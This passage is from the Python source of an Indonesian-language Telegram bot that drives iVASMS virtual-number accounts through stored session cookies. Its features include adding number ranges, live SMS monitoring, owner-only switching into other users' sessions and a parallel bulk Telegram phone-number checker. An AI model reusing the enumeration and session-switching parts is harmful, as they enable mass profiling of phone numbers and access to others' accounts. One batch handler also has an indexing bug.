        admins = cur.fetchall()
        text = f"{em(CE_PROFILE, '👤')} <b>DAFTAR ADMIN BOT</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
        keyboard = []
        if not admins or (len(admins) == 1 and admins[0][0] == USER_ID):
            text += "📭 <i>Belum ada admin lain selain Owner.</i>\n"
        else:
            for ad in admins:
                aid = ad[0]
                if aid != USER_ID:
                    text += f"  {em(E1, '⭐')} Admin ID: <code>{aid}</code>\n"
                    keyboard.append([
                        InlineKeyboardButton(f"HAPUS: {aid}", callback_data=f"owner_del_admin_{aid}", icon_custom_emoji_id="5870875489362513438", style="danger")
                    ])
        text += f"\n━━━━━━━━━━━━━━━━━━━━━━"
        keyboard.append([InlineKeyboardButton("KEMBALI", callback_data="owner_menu", icon_custom_emoji_id="5449847653586188540", style="danger")])
        await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(keyboard))
        return

    if data.startswith('owner_del_admin_'):
        target_aid = int(data.replace('owner_del_admin_', ''))
        cur.execute("DELETE FROM admins WHERE user_id = ?", (target_aid,))
        conn.commit()
        await query.answer("Admin berhasil dihapus!", show_alert=True)
        # Re-trigger del admin list
        query.data = 'owner_del_admin_prompt'
        await menu_callback(update, context)
        return

    if data == 'owner_ban_user_prompt':
        context.user_data[f'waiting_owner_ban_user_{user_id}'] = True
        await query.edit_message_text(
            f"{em(E5, '🛑')} <b>BANNED USER</b>\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Silakan kirimkan <b>User ID</b> atau <b>@username</b> user yang ingin Anda blokir (banned).\n\n<i>Contoh: 123456789 atau @username</i>\n\n"
            f"<i>Contoh: 123456789</i>\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("BATAL", callback_data="owner_menu", icon_custom_emoji_id="5870601874175954911", style="danger")
            ]])
        )
        return

    if data == 'owner_unban_user_prompt':
        context.user_data[f'waiting_owner_unban_user_{user_id}'] = True
        await query.edit_message_text(
            f"{em(E2, '🟢')} <b>UNBAN USER</b>\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Silakan kirimkan <b>User ID</b> atau <b>@username</b> user yang ingin Anda unban.\n\n<i>Contoh: 123456789 atau @username</i>\n\n"
            f"<i>Contoh: 123456789</i>\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("BATAL", callback_data="owner_menu", icon_custom_emoji_id="5870601874175954911", style="danger")
            ]])
        )
        return

    # ─── OWNER CONSOLE callbacks ─────────────────────────
    if data == 'owner_menu':
        await owner_menu_callback(update, context)
        return
        
    if data == 'owner_list_users':
        await owner_list_users_callback(update, context)
        return
        
    if data.startswith('owner_del_user_'):
        target_uid = int(data.replace('owner_del_user_', ''))
        cur.execute("DELETE FROM allowed_users WHERE user_id = ?", (target_uid,))
        conn.commit()
        await query.answer("User berhasil dihapus!", show_alert=True)
        await owner_list_users_callback(update, context)
        return
        
    if data == 'owner_add_user_prompt':
        context.user_data[f'waiting_owner_add_user_{user_id}'] = True
        await query.edit_message_text(
            f"{em(CE_ADD, '➕')} <b>TAMBAH USER BARU</b>\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Silakan kirimkan <b>User ID</b> atau <b>@username</b> user yang ingin Anda tambahkan.\n\n"
            f"<i>Contoh: 123456789 atau @username</i>\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("BATAL", callback_data="owner_menu", icon_custom_emoji_id="5870601874175954911", style="danger")
            ]])
        )
        return
        
    if data == 'owner_broadcast_prompt':
        context.user_data[f'waiting_owner_bc_{user_id}'] = True
        await query.edit_message_text(
            f"{em(E2, '📢')} <b>BROADCAST PENGUMUMAN</b>\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Silakan ketik dan kirimkan pesan broadcast yang ingin disebarkan ke seluruh user.\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("BATAL", callback_data="owner_menu", icon_custom_emoji_id="5870601874175954911", style="danger")
            ]])
        )
        return
        
    if data == 'owner_switch_list':
        await switch_command(update, context)
        return
        
    if data == 'owner_unswitch':
        await unswitch_command(update, context)
        return
        
    if data == 'owner_stats':
        await stats_command(update, context)
        return
        
    if data == 'owner_toggle_mt':
        global MAINTENANCE_MODE
        MAINTENANCE_STATE['all'] = not MAINTENANCE_STATE.get('all', False)
        MAINTENANCE_MODE = MAINTENANCE_STATE['all']
        save_maintenance_status()
        status_str = "AKTIF 🟢" if MAINTENANCE_MODE else "NON-AKTIF 🔴"
        await query.answer(f"Maintenance Mode (semua fitur): {status_str}", show_alert=True)
        await owner_menu_callback(update, context)
        return

    if data.startswith('switch_acc_'):
        target_email = data.replace('switch_acc_', '')
        
        # Matikan yang lama, aktifkan yang baru untuk user ini
        cur.execute("UPDATE user_sessions SET is_active = 0 WHERE user_id = ?", (user_id,))
        cur.execute("UPDATE user_sessions SET is_active = 1 WHERE user_id = ? AND email = ?", (user_id, target_email))
        conn.commit()
        
        await query.answer(f"Berhasil pindah ke: {target_email}", show_alert=True)
        # Kembali ke menu start dengan session baru
        await start_command(update, context)
        return

    if data.startswith('switch_to_'):
        if user_id != USER_ID:
            await query.answer("❌ Menu ini hanya untuk Owner!", show_alert=True)
            return
        
        parts = data.replace('switch_to_', '').split('_', 1)
        if len(parts) < 2:
            await query.answer("❌ Format data tidak valid", show_alert=True)
            return
        
        target_user_id_str, target_email = parts
        try:
            target_user_id = int(target_user_id_str)
            cur.execute("""
                INSERT INTO owner_switch (owner_id, target_user_id, target_email)
                VALUES (?, ?, ?)
                ON CONFLICT(owner_id) DO UPDATE SET
                    target_user_id = excluded.target_user_id,
                    target_email = excluded.target_email
            """, (USER_ID, target_user_id, target_email))
            conn.commit()
            
            await query.answer(f"✅ Switched to {target_email} ({target_user_id})", show_alert=True)
            await query.message.edit_text(
                f"✅ <b>Berhasil Switch Akun!</b>\n\n"
                f"👤 <b>Target User ID:</b> <code>{target_user_id}</code>\n"
                f"✉️ <b>Target Email:</b> <code>{target_email}</code>\n\n"
                f"Sekarang bot akan berjalan menggunakan sesi target. Gunakan /unswitch untuk kembali.",
                parse_mode=ParseMode.HTML
            )
        except Exception as e:
            await query.answer(f"❌ Error: {e}", show_alert=True)
        return

    if data == 'unswitch_acc':
        if user_id != USER_ID:
            await query.answer("❌ Menu ini hanya untuk Owner!", show_alert=True)
            return
        
        try:
            cur.execute("DELETE FROM owner_switch WHERE owner_id = ?", (USER_ID,))
            conn.commit()
            await query.answer("✅ Kembali ke Sesi Owner", show_alert=True)
            await query.message.edit_text("✅ Sesi Owner telah dikembalikan! Anda kembali menggunakan akun asli Anda.")
        except Exception as e:
            await query.answer(f"❌ Error: {e}", show_alert=True)
        return

    await query.answer()  
    
    data = query.data
    chat = query.message.chat

    # Handler untuk tombol STOP MONITOR di pesan notif
    if data.startswith('notif_stop_'):
        try:
            target_user = int(data.replace('notif_stop_', ''))
        except (ValueError, TypeError):
            await query.answer(" Format tidak valid", show_alert=True)
            return

        if target_user != user_id and user_id != USER_ID:
            await query.answer(" Bukan untuk kamu!", show_alert=True)
            return

        if target_user in active_notif_monitor:
            active_notif_monitor.discard(target_user)
            notif_seen_sms.pop(target_user, None)

            # Hitung durasi dan cleanup
            duration_text = ""
            if target_user in notif_start_time:
                delta = datetime.now() - notif_start_time.pop(target_user)
                mins = int(delta.total_seconds() // 60)
                secs = int(delta.total_seconds() % 60)
                duration_text = f"\n{em(CE_WAKTU,'⏲')} <b>Durasi</b>: <code>{mins}m {secs}s</code>"
            sms_detected = notif_sms_count.pop(target_user, 0)

            await query.answer("🛑 Live Monitor dimatikan", show_alert=True)
            try:
                stop_text = (
                    f"{_header('MONITOR STOPPED')}\n\n"
                    f"{em(E6,'⭐')} <b>Status</b>: 🔴 <code>STOPPED</code>"
                    f"{duration_text}\n"
                    f"{em(CE_EMAIL,'📩')} <b>SMS Terdeteksi</b>: <code>{sms_detected}</code>\n\n"
                    f"{em(E2,'⭐')} Gunakan /notif untuk mengaktifkan kembali.\n\n"
                    f"{_footer()}"
                )
                await query.message.edit_text(
                    stop_text,
                    parse_mode=ParseMode.HTML
                )
            except Exception:
                try:
                    await query.edit_message_reply_markup(reply_markup=None)
                except Exception:
                    pass
        else:
            await query.answer("Monitor memang sudah mati", show_alert=True)
        return

    if data.startswith('menu_accounts_'):
        await accounts_command(update, context)
        return

    # ─── CHECK TELEGRAM callback ──────────────────────────
    if data.startswith('menu_check_'):
        await query.answer()
        try:
            await query.edit_message_text(
                _screen('CHECK TELEGRAM', (
                    f"{em(CE_TELEGRAM,'💬')} <b>TELEGRAM ACCOUNT CHECKER</b>\n\n"
                    f"Cek apakah nomor telepon punya akun Telegram.\n\n"
                    f"<b>Cara pakai:</b>\n"
                    f"  • <code>/check 628123456789</code>\n"
                    f"  • <code>/check 628xx 628yy 628zz</code>\n"
                    f"  • Reply file <code>.txt</code> dengan <code>/check</code>\n\n"
                    f"<b>Status:</b>\n"
                    f"  {em(E1,'✅')} <b>Aktif</b> = punya app Telegram\n"
                    f"  {em(E6,'📱')} <b>SMS</b> = terdaftar tapi OTP via SMS\n"
                    f"  {em(E2,'❌')} <b>Tidak</b> = tidak terdaftar\n"
                    f"  {em(E2,'🚫')} <b>Banned</b> = nomor di-ban\n\n"
                    f"<b>Fitur:</b>\n"
                    f"  {em(E6,'🚀')} 20 worker paralel (super cepat)\n"
                    f"  {em(CE_EXPORT,'📤')} Export hasil ke .txt\n"
                    f"  {em(CE_FILE,'📁')} Riwayat tersimpan di DB\n\n"
                    f"{em(CE_WAKTU,'⏲')} <i>Ketik /check untuk mulai</i>"
                ), 'Home › Check'),
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("RIWAYAT", callback_data=f"tgcheck_history_{user_id}",
                                         icon_custom_emoji_id=CE_FILE, style="primary"),
                    InlineKeyboardButton("KEMBALI", callback_data=f"menu_start_{user_id}",
                                         icon_custom_emoji_id=CE_BACK, style="danger"),
                ]]),
            )
        except Exception:
            pass
        return

    # ─── LINE EXTRACTOR callbacks ─────────────────────────
    if data.startswith('menu_line_') or data.startswith('line_again_'):
        context.user_data[f'line_waiting_file_{user_id}'] = True
        context.user_data.pop(f'line_waiting_range_{user_id}', None)
        try:
            await query.edit_message_text(
                _line_extractor_intro_text(user_id),
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("BATAL", callback_data=f"line_cancel_{user_id}", icon_custom_emoji_id="5870601874175954911", style="danger"),
                    InlineKeyboardButton("KEMBALI KE MENU", callback_data=f"menu_start_{user_id}", icon_custom_emoji_id="5449847653586188540", style="danger")
                ]])
            )
        except Exception:
            await chat.send_message(
                _line_extractor_intro_text(user_id),
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("BATAL", callback_data=f"line_cancel_{user_id}", icon_custom_emoji_id="5870601874175954911", style="danger"),
                    InlineKeyboardButton("KEMBALI KE MENU", callback_data=f"menu_start_{user_id}", icon_custom_emoji_id="5449847653586188540", style="danger")
                ]])
            )
        return

    if data.startswith('line_cancel_'):
        context.user_data.pop(f'line_waiting_file_{user_id}', None)
        context.user_data.pop(f'line_waiting_range_{user_id}', None)
        context.user_data.pop(f'line_lines_{user_id}', None)
        context.user_data.pop(f'line_filename_{user_id}', None)
        try:
            await query.edit_message_text(
                f"{em(E2,'⭐')} <b>Line Extractor dibatalkan.</b>",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("KEMBALI KE MENU", callback_data=f"menu_start_{user_id}", icon_custom_emoji_id="5449847653586188540", style="danger")
                ]])
            )
        except Exception:
            pass
        return

    elif data.startswith('menu_start_'):
        await query.answer()
        await start_command(update, context)
        return

    elif data.startswith('menu_cookies_'):
        await query.edit_message_text(
            _build(TEMPLATE_COOKIES, 'LOGIN · COOKIES'),
            parse_mode=ParseMode.HTML,
            reply_markup=get_back_keyboard(user_id)
        )
    
    
    elif data.startswith('logout_confirm_'):
        target_user = int(data.split('_')[2])
        
        if target_user != user_id:
            await query.answer(" Bukan untuk kamu!", show_alert=True)
            return
        
        email, _, _, _, _, _, _ = get_user_session(user_id)
        
        success, remaining_email = logout_user(user_id)
        
        if success:
            if remaining_email:
                text = f"""{em(E1, '⭐')} <b>LOGOUT BERHASIL</b> 

{EMOJI['LINE']}
{EMOJI['USER']} User ID: {user_id}
{EMOJI['MAIL']} Email Keluar: {email}

 Sesi telah dihapus dari database
🔄 <b>Otomatis berpindah ke akun Anda yang lain:</b> <code>{remaining_email}</code>
{EMOJI['LINE']}"""
            else:
                text = f"""{em(E1, '⭐')} <b>LOGOUT BERHASIL</b> 

{EMOJI['LINE']}
{EMOJI['USER']} User ID: {user_id}
{EMOJI['MAIL']} Email Keluar: {email}

 Sesi telah dihapus dari database
{EMOJI['LINE']}

Silahkan login kembali dengan /cookies"""
            
            await query.edit_message_text(
                text,
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("KEMBALI KE MENU", callback_data=f"menu_start_{user_id}", icon_custom_emoji_id="5449847653586188540", style="danger")
                ]])
            )
        else:
            await query.edit_message_text(
                f"{em(E2, '⭐')} <b>GAGAL LOGOUT</b>\n\nTerjadi kesalahan saat menghapus session.",
                parse_mode=ParseMode.HTML,
                reply_markup=get_back_keyboard(user_id)
            )
    
    
    elif data.startswith('menu_addrange_'):
        await query.edit_message_text(
            f"{em(E5,'🏴‍☠️')} <b>CARI RANGE DENGAN FORMAT</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"{em(E1,'⭐')} Gunakan format: <code>kode|negara</code>\n\n"
            f"{em(E2,'⭐')} <b>Contoh:</b>\n"
            f"• <code>59127|bolivia</code> - Cari kode 59127 di Bolivia\n"
            f"• <code>51919|peru</code> - Cari kode 51919 di Peru\n"
            f"• <code>614|australia</code> - Cari kode 614 di Australia\n"
            f"• <code>447|uk</code> - Cari kode 447 di UK\n"
            f"• <code>62|indonesia</code> - Cari kode 62 di Indonesia\n\n"
            f"{em(E2,'⭐')} Ketik perintah:\n<code>/addrange 59127|bolivia</code>\n\n"
            f"{em(E2,'⭐')} Atau langsung ketik:\n<code>59127|bolivia</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{em(E4,'🎧')} <i>Powered by DikZz</i>",
            parse_mode=ParseMode.HTML,
            reply_markup=get_back_keyboard(user_id)
        )
    
    
    elif data.startswith('menu_bulk_'):
        if not check_user_login(user_id):
            await query.edit_message_text(
                _build(TEMPLATE_ERROR, 'GAGAL', message=f"{em(E2,'⭐')} Kamu belum login!"),
                parse_mode=ParseMode.HTML,
                reply_markup=get_back_keyboard(user_id)
            )
            return
        
        await query.edit_message_text(
            _build(TEMPLATE_BULK, 'HAPUS SEMUA NOMOR'),
            parse_mode=ParseMode.HTML,
            reply_markup=get_bulk_keyboard(user_id)
        )
    
    
    elif data.startswith('live_sms_'):
        try:
            target_user = int(data.split('_')[2])

            if target_user != user_id and user_id != USER_ID:
                await query.answer("Bukan untuk kamu!", show_alert=True)
                return
                
            await query.answer()

            if not check_user_login(user_id):
                await query.edit_message_text(
                    _build(TEMPLATE_ERROR, 'GAGAL', message=f"{em(E2,'\u2726')} Kamu belum login!"),
                    parse_mode=ParseMode.HTML,
                    reply_markup=get_back_keyboard(user_id)
                )
                return

            # Tampilkan cache dulu jika ada, baru fetch di background
            cached = context.bot_data.get(f'live_cache_{user_id}')
            if cached:
                try:
                    await query.edit_message_text(
                        cached['text'] + f"\n\n  {em(CE_LOADING,'🟠')} <i>Memperbarui...</i>",
                        parse_mode=ParseMode.HTML,
                        reply_markup=cached['markup']
                    )
                except Exception:
                    try:
                        await query.edit_message_text(
                            f"{em(CE_LOADING,'🟠')} <i>Memperbarui data live SMS...</i>",
                            parse_mode=ParseMode.HTML
                        )
                    except Exception:
                        await query.edit_message_text(
                            "🟠 Memperbarui data live SMS..."
                        )
            else:
                try:
                    await query.edit_message_text(
                        f"{em(CE_LOADING,'🟠')} <i>Mengambil 10 SMS terbaru...</i>",
                        parse_mode=ParseMode.HTML
                    )
                except Exception:
                    await query.edit_message_text(
                        "🟠 Mengambil 10 SMS terbaru..."
                    )

            asyncio.create_task(process_live_sms_background(query.message, user_id, context))
        except Exception as e:
            logger.error(f"Error live_sms: {e}")
            try:
                await query.answer("Error memproses live SMS", show_alert=True)
            except Exception:
                pass

    
    elif data.startswith('logout_menu_'):
        target_user = int(data.split('_')[2])
        
        if target_user != user_id:
            await query.answer(" Bukan untuk kamu!", show_alert=True)
            return
        
        if not check_user_login(user_id):
            await query.edit_message_text(
                " Kamu belum login!",
                parse_mode=ParseMode.HTML,
                reply_markup=get_back_keyboard(user_id)
            )
            return
        
        email, _, _, _, _, _, _ = get_user_session(user_id)
        
        text = f""" KONFIRMASI LOGOUT 

{EMOJI['LINE']}
{EMOJI['USER']} User ID: {user_id}
{EMOJI['MAIL']} Email: {email}

{em(E2, '⭐')} <b>PERINGATAN!</b>
Session akan dihapus dari database.
Anda perlu login ulang dengan /cookies
{EMOJI['LINE']}

Yakin ingin logout?"""
        
        await query.edit_message_text(
            text,
            parse_mode=ParseMode.HTML,
            reply_markup=get_logout_keyboard(user_id)
        )

    
    elif data.startswith('live_add_'):
        
        parts = data.split('_')
        termination_id = parts[2]
        range_name = parts[3]
        for i in range(4, len(parts)-1):
            range_name += f"_{parts[i]}"
        target_user = int(parts[-1])
    
        if target_user != user_id and user_id != USER_ID:
            await query.answer(" Bukan untuk kamu!", show_alert=True)
            return
        
        
        email, _, _, _, _, _, _ = get_user_session(user_id)
        
        
        await query.edit_message_text(
            f"{em(E5,'🏴‍☠️')} <b>iVASMS · PROCESS ADD NUMBER</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{em(E1,'⭐')} <b>Range:</b> <code>{range_name}</code>\n"
            f"{em(E2,'⭐')} <b>Akun:</b> <code>{email}</code>\n\n"
            f"{em(CE_LOADING,'🟠')} <b>Status:</b>\n"
            f"├─ Pre-Bulk Cleaning: <code>[Running...] 🗑</code>\n"
            f"├─ Socket Connection: <code>[Pending]</code>\n"
            f"└─ Add Number Process: <code>[Pending]</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{em(E4,'🎧')} <i>Powered by DikZz</i>",
            parse_mode=ParseMode.HTML
        )
        
        
        task_id = f"live_add_{user_id}_{int(time.time())}"
        
        
        asyncio.create_task(process_add_background(
            query.message, user_id, email, range_name, task_id, "live"
        ))

        
    elif data.startswith('lm_'):
        try:
            parts = data.split('_')
            # Format yang benar: lm_{termination_id}_{filter_country}_{search_prefix}_{user_id}
            # target_user selalu di akhir, jadi parse dari belakang biar tahan kalau ada
            # field di tengah yang kebetulan kosong/aneh.
            if len(parts) < 5:
                await query.answer(" Format data tidak valid", show_alert=True)
                return

            termination_id = parts[1]
            try:
                target_user = int(parts[-1])
            except (ValueError, TypeError):
                await query.answer(" Format data tidak valid", show_alert=True)
                return
            filter_country = parts[2] if len(parts) >= 3 else ''
            # Bagian tengah dianggap search_prefix (digabung kalau lebih dari 1 part)
            if len(parts) > 4:
                search_prefix = '_'.join(parts[3:-1])
            else:
                search_prefix = ''
            
            if target_user != user_id and user_id != USER_ID:
                await query.answer(" Bukan untuk kamu!", show_alert=True)
                return
        
            
            range_name = None
            
            
            term_id_map = context.user_data.get(f'term_id_map_{user_id}', {})
            
            if termination_id in term_id_map:
                range_name = term_id_map[termination_id]
                print(f"[CACHE] Found range_name for term_id {termination_id}: {range_name}")
            else:
                
                print(f"[DEBUG] Mencari range untuk term_id: {termination_id} (not in cache)")
                _, _, _, _, cookies_dict, csrf, logged_in = get_user_session(user_id)
                
                if logged_in and cookies_dict and csrf:
                    session = requests.Session()
                    for key, value in cookies_dict.items():
                        session.cookies.set(key, value)
                    
                    
                    
                    search_results = await bg.run(user_id, search_numbers, session, csrf, filter_country, 1)
                
                    if search_results and 'data' in search_results:
                        for item in search_results['data']:
                            if str(item.get('id')) == termination_id:
                                range_name = item.get('range', 'Unknown')
                                print(f"[DEBUG] Found: {range_name}")
                                break
                    
                    
                    if not range_name or range_name == "Unknown":
                        search_results = await bg.run(user_id, search_numbers, session, csrf, search_prefix, 1)
                        if search_results and 'data' in search_results:
                            for item in search_results['data']:
                                if str(item.get('id')) == termination_id:
                                    range_name = item.get('range', 'Unknown')
                                    print(f"[DEBUG] Found (second try): {range_name}")
                                    break
                    
                    
                    if range_name and range_name != "Unknown":
                        term_id_map[termination_id] = range_name
                        context.user_data[f'term_id_map_{user_id}'] = term_id_map
                        print(f"[CACHE] Saved mapping: {termination_id} -> {range_name}")
            
            
            if not range_name or range_name == "Unknown":
                range_name = f"{filter_country} {search_prefix}"
            
            
            keyboard = [
                [
                    InlineKeyboardButton("ADD NOMOR", callback_data=f"live_add_{termination_id}_{range_name}_{user_id}", icon_custom_emoji_id=CE_ADD, style="success")
                ],
                [
                    InlineKeyboardButton("ADD RANGE", callback_data=f"live_search_{search_prefix}_{filter_country}_{user_id}", icon_custom_emoji_id=CE_ADD, style="success")
                ],
                [
                    InlineKeyboardButton("KEMBALI", callback_data=f"live_sms_{user_id}", icon_custom_emoji_id="5449847653586188540", style="danger")
                ]
            ]
            
            
            display_range = range_name[:35] + ".." if len(range_name) > 35 else range_name
            
            await query.edit_message_text(
                f"{em(E1,'⭐')} <b>Range:</b> {display_range}\n"
                f"{em(CE_NOMOR,'⭐')} <b>Nomor:</b> {search_prefix}...\n"
                f"{em(E2,'⭐')} <b>Negara:</b> {filter_country}\n\n"
                f"Pilih aksi:",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        
        except Exception as e:
            logger.error(f"Error live_menu: {e}")
            await query.answer(" Gagal memproses", show_alert=True)

    
        
    elif data.startswith('live_search_'):
        
        parts = data.split('_')
        search_prefix = parts[2]
        country_name = parts[3]
        target_user = int(parts[-1])
        
        if target_user != user_id and user_id != USER_ID:
            await query.answer(" Bukan untuk kamu!", show_alert=True)
            return
        
        
        search_text = f"{search_prefix}|{country_name}"
        
        await query.edit_message_text(
            f"{em(CE_ADD,'✨')} <b>Mencari range:</b> {search_text}\n\n{em(CE_LOADING,'🟠')} <i>Mohon tunggu...</i>",
            parse_mode=ParseMode.HTML
        )
        
        
        
        _, _, _, _, cookies_dict, csrf, logged_in = get_user_session(user_id)
        
        if not logged_in or not cookies_dict or not csrf:
            await query.edit_message_text(
                f"{em(E2,'⭐')} Session expired! Silahkan login ulang.",
                parse_mode=ParseMode.HTML,
                reply_markup=get_back_keyboard(user_id)
            )
            return
        
        session = requests.Session()
        for key, value in cookies_dict.items():
            session.cookies.set(key, value)
        
        email, _, _, _, _, _, _ = get_user_session(user_id)
        
        
        asyncio.create_task(process_search_range_background(
            query.message, user_id, email, search_prefix, country_name, session, csrf, context
        ))

    
    elif data.startswith('add_menu_'):
        await query.edit_message_text(
            "📝 <b>CARA MENAMBAH NOMOR</b>\n\n"
            "Gunakan command:\n"
            "/add [RANGE]\n\n"
            "Contoh:\n"
            "• /add EGYPT 70\n"
            "• /add PERU 91\n"
            "• /add KAZAKHSTAN 13003\n\n"
            "💡 Fitur ini akan menambah 1 nomor saja.\n"
            "Jika akun penuh, akan auto bulk lalu coba sekali lagi.",
            parse_mode=ParseMode.HTML,
            reply_markup=get_back_keyboard(user_id)
        )

    
    elif data.startswith('stop_'):
        parts = data.split('_')
        task_id = parts[1]
        target_user = int(parts[-1])

        if user_id != target_user and user_id != USER_ID:
            await query.answer(" Bukan task kamu!", show_alert=True)
            return

        try:
            cur.execute("UPDATE active_tasks SET cancel_flag = 1 WHERE task_id = ?", (task_id,))
            conn.commit()
            await query.answer("⏹️ Proses akan dihentikan...")
        except Exception as e:
            logger.error(f"Error stopping task: {e}")
            await query.answer(" Gagal menghentikan proses", show_alert=True)
    
        
    elif data.startswith('universal_select_'):
        try:
            parts = data.split('_')
            if len(parts) < 4:
                await query.answer(" Format data tidak valid", show_alert=True)
                return
                
            term_id = parts[2]
            range_parts = []
            for i in range(3, len(parts)-1):
                range_parts.append(parts[i])
            range_name = '_'.join(range_parts)
            target_user = int(parts[-1])

            if target_user != user_id and user_id != USER_ID:
                await query.answer(" Bukan untuk kamu!", show_alert=True)
                return

            
            email, _, _, _, _, _, logged_in = get_user_session(user_id)
            
            if not logged_in:
                await query.edit_message_text(
                    " Kamu belum login!",
                    parse_mode=ParseMode.HTML,
                    reply_markup=get_back_keyboard(user_id)
                )
                return

            
            context.user_data[f'selected_term_id_{user_id}'] = term_id
            context.user_data[f'selected_range_{user_id}'] = range_name

            
            keyboard = [
                [
                    InlineKeyboardButton(" 1", callback_data=f"universal_add_{term_id}_{range_name}_1_{user_id}", style="primary"),
                ],
                [InlineKeyboardButton("KEMBALI", callback_data=f"menu_addrange_{user_id}", icon_custom_emoji_id="5449847653586188540", style="danger")]
            ]

            await query.edit_message_text(
                f"{em(E1,'⭐')} <b>Range:</b> {range_name[:30]}\n{em(E2,'⭐')} <b>Email:</b> {email}\n\nPilih jumlah nomor yang ingin ditambah:",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        except Exception as e:
            logger.error(f"Error universal_select_: {e}")
            await query.answer(" Error parsing data", show_alert=True)

    
        
    elif data.startswith('universal_add_'):
        try:
            parts = data.split('_')
            print(f"[DEBUG] universal_add_ parts: {parts}")  
            if len(parts) < 5:
                await query.answer(" Format data tidak valid", show_alert=True)
                return
                
            term_id = parts[2]
            range_parts = []
            for i in range(3, len(parts)-2):
                range_parts.append(parts[i])
            range_name = '_'.join(range_parts)
            count = int(parts[-2])
            target_user = int(parts[-1])
            
            print(f"[DEBUG] universal_add_ - term_id: {term_id}, range: {range_name}, count: {count}, user: {target_user}")  

            if target_user != user_id and user_id != USER_ID:
                await query.answer(" Bukan untuk kamu!", show_alert=True)
                return

            
            email, _, _, _, cookies_dict, csrf, logged_in = get_user_session(user_id)
            
            if not logged_in or not cookies_dict or not csrf:
                await query.edit_message_text(
                    f"{em(E2,'⭐')} Session expired! Silahkan login ulang.", 
                    parse_mode=ParseMode.HTML,
                    reply_markup=get_back_keyboard(user_id)
                )
                return

            
            session = requests.Session()
            for key, value in cookies_dict.items():
                session.cookies.set(key, value)

            
            task_id = f"add_{user_id}_{range_name}"
            try:
                cur.execute("INSERT INTO active_tasks (task_id, user_id, cancel_flag) VALUES (?, ?, 0)", 
                           (task_id, user_id))
                conn.commit()
            except:
                pass

            await query.edit_message_text(
                f"{em(E5,'🏴‍☠️')} <b>MEMPROSES {count} NOMOR</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"  {em(E1,'⭐')} <b>Range</b>  : <code>{range_name[:30]}</code>\n"
                f"  {em(CE_EMAIL,'📩')} <b>Email</b>  : <code>{email}</code>\n\n"
                f"  <code>▰▱▱▱▱▱▱▱▱▱</code> 0/{count} selesai\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"{em(E4,'🎧')} <i>Powered by DikZz</i>",
                parse_mode=ParseMode.HTML,
                reply_markup=get_progress_keyboard(task_id, user_id)
            )

            
            print(f"[DEBUG] Memulai process_add_range_task")  
            asyncio.create_task(process_add_range_task(
                query.message, user_id, email, range_name, term_id, count, session, csrf
            ))
            print(f"[DEBUG] Task created")  

        except Exception as e:
            logger.error(f"Error universal_add_: {e}")
            print(f"[DEBUG] Exception: {e}")  
            import traceback
            traceback.print_exc()
            await query.edit_message_text(
                f" Error: {str(e)[:100]}",
                parse_mode=ParseMode.HTML,
                reply_markup=get_back_keyboard(user_id)
            )

    elif data.startswith('universal_batch_exec_'):
        try:
            parts = data.split('_')
            print(f"[DEBUG] universal_batch_exec parts: {parts}")
            print(f"[DEBUG] Current user_id: {user_id}")

            
            if len(parts) == 4:  
                
                target_user = int(parts[3])  
                count_per_range = int(parts[4])  
                
                print(f"[DEBUG] target_user: {target_user}")
                print(f"[DEBUG] count_per_range: {count_per_range}")

                if target_user != user_id and user_id != USER_ID:
                    await query.answer(" Bukan untuk kamu!", show_alert=True)
                    return
            
            email, _, _, _, cookies_dict, csrf, logged_in = get_user_session(user_id)
            
            if not logged_in or not cookies_dict or not csrf:
                await query.edit_message_text(
                    f"{em(E2, '⭐')} <b>SESSION EXPIRED</b>\n\nSilahkan login ulang dengan /cookies",
                    parse_mode=ParseMode.HTML,
                    reply_markup=get_back_keyboard(user_id)
                )
                return

            
            session = requests.Session()
            for key, value in cookies_dict.items():
                session.cookies.set(key, value)

            
            universal_ranges = context.user_data.get(f'universal_ranges_{user_id}', [])
            
            print(f"[BATCH] universal_ranges: {len(universal_ranges)} items")
            
            if not universal_ranges:
                await query.edit_message_text(
                    f"{em(E2, '⭐')} <b>DATA RANGE HILANG</b>\n\n"
                    "Silahkan cari ulang dengan /addrange",
                    parse_mode=ParseMode.HTML,
                    reply_markup=get_back_keyboard(user_id)
                )
                return

            
            preview_text = ""
            for i, r in enumerate(universal_ranges[:5], 1):
                preview_text += f"{i}. {r['name'][:30]}\n"
            if len(universal_ranges) > 5:
                preview_text += f"...dan {len(universal_ranges)-5} lainnya"

            
            try:
                await query.message.delete()
            except:
                pass

            
